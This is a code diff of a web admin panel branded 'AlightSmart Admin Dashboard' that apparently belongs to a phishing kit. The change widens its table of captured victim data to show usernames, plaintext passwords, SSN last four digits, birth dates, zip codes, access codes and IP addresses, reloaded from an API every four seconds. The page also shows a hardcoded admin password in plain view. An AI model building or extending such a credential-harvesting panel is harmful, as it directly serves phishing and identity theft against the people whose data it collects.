@@ -7,14 +7,12 @@
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body { font-family: 'Segoe UI', sans-serif; background: #f8fafc; padding: 20px; }
-        .container { max-width: 1400px; margin: auto; background: white; border-radius: 12px; box-shadow: 0 10px 30px rgba(0,0,0,0.1); }
+        .container { max-width: 1600px; margin: auto; background: white; border-radius: 12px; box-shadow: 0 10px 30px rgba(0,0,0,0.1); }
         .header { background: #1e40af; color: white; padding: 25px; text-align: center; }
-        .section { margin: 25px; }
-        h2 { color: #1e40af; margin-bottom: 12px; }
-        table { width: 100%; border-collapse: collapse; margin-bottom: 30px; }
+        table { width: 100%; border-collapse: collapse; }
         th, td { padding: 14px; text-align: left; border-bottom: 1px solid #ddd; }
         th { background: #e2e8f0; }
-        button { padding: 12px 25px; margin: 10px 5px; border: none; border-radius: 8px; cursor: pointer; font-size: 1rem; }
+        button { padding: 12px 25px; margin: 10px; border: none; border-radius: 8px; cursor: pointer; }
         .refresh-btn { background: #3b82f6; color: white; }
         .clear-btn { background: #ef4444; color: white; }
     </style>
@@ -23,28 +21,28 @@
     <div class="container">
         <div class="header">
             <h1>🔐 AlightSmart Admin Dashboard</h1>
-            <p>Password: | Supabase Permanent</p>
+            <p>Password: tunde6035</p>
         </div>
 
-        <div class="section">
-            <h2>🔴 Page Visits (Link Clicks)</h2>
-            <table id="visitTable">
-                <thead><tr><th>Time</th><th>Type</th><th>IP</th></tr></thead>
-                <tbody></tbody>
-            </table>
-        </div>
+        <table id="recordsTable">
+            <thead>
+                <tr>
+                    <th>Time</th>
+                    <th>Username</th>
+                    <th>Password</th>
+                    <th>SSN (Last 4)</th>
+                    <th>Birth Date</th>
+                    <th>Zip Code</th>
+                    <th>Access Code</th>
+                    <th>IP</th>
+                </tr>
+            </thead>
+            <tbody></tbody>
+        </table>
 
-        <div class="section">
-            <h2>1. Login Records</h2>
-            <table id="loginTable">
-                <thead><tr><th>Time</th><th>Username</th><th>Password</th><th>Address</th><th>IP</th></tr></thead>
-                <tbody></tbody>
-            </table>
-        </div>
-
-        <div style="text-align: center;">
+        <div style="text-align: center; padding: 20px;">
             <button class="refresh-btn" onclick="loadRecords()">🔄 Refresh Now</button>
-            <button class="clear-btn" onclick="clearRecords()">🗑️ Clear All</button>
+            <button class="clear-btn" onclick="clearRecords()">🗑️ Clear All Records</button>
         </div>
     </div>
 
@@ -54,18 +52,21 @@
         async function loadRecords() {
             const res = await fetch('/api/records');
             const records = await res.json();
-
-            const loginBody = document.querySelector('#loginTable tbody');
-            const visitBody = document.querySelector('#visitTable tbody');
-            loginBody.innerHTML = "";
-            visitBody.innerHTML = "";
+            const tbody = document.querySelector('#recordsTable tbody');
+            tbody.innerHTML = "";
 
             records.forEach(r => {
-                if (r.type === "Login Attempt") {
-                    loginBody.innerHTML += `<tr><td>${r.timestamp}</td><td><strong>${r.username||'-'}</strong></td><td><code>${r.password||'-'}</code></td><td>${r.address||'-'}</td><td>${r.ip||'-'}</td></tr>`;
-                } else {
-                    visitBody.innerHTML += `<tr><td>${r.timestamp}</td><td>${r.type}</td><td>${r.ip||'-'}</td></tr>`;
-                }
+                tbody.innerHTML += `
+                    <tr>
+                        <td>${r.timestamp}</td>
+                        <td><strong>${r.username || '-'}</strong></td>
+                        <td><code>${r.password || '-'}</code></td>
+                        <td>${r.address ? r.address.split('|')[0] : '-'}</td>
+                        <td>${r.address ? r.address.split('|')[1] : '-'}</td>
+                        <td>${r.address ? r.address.split('|')[2] : '-'}</td>
+                        <td>${r.address ? r.address.split('|')[3] : '-'}</td>
+                        <td>${r.ip || '-'}</td>
+                    </tr>`;
             });
         }
 
@@ -75,13 +76,13 @@
                 loadRecords();
                 setInterval(loadRecords, 4000);
             } else {
-                alert("Wrong Password");
+                alert("❌ Wrong Password");
                 window.location.href = "/";
             }
         };
 
         async function clearRecords() {
-            if (confirm("Clear all records?")) {
+            if (confirm("Clear ALL records?")) {
                 await fetch('/api/clear', { method: 'POST' });
                 loadRecords();
             }
